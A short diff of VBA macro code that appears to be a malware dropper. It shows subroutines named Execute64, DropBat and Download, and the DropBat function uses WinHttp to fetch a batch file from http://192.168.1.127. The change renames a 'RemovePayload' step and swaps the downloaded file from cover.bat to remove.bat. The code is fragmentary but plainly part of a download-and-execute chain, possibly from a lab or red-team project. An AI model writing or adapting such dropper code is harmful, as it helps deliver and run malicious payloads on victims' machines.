@@ -6,7 +6,7 @@ Else
     Execute64
 End If
 DropBat
-RemovePayload
+Remove
 End Sub
 
 Public Function Download() As Variant
@@ -114,7 +114,7 @@ Public Function DropBat() As Variant
     End If
     On Error GoTo 0
     
-    MyFile2 = "http://192.168.1.127/cover.bat"
+    MyFile2 = "http://192.168.1.127/remove.bat"
     
     WHTTP2.Open "GET", MyFile2, False
     WHTTP2.Send
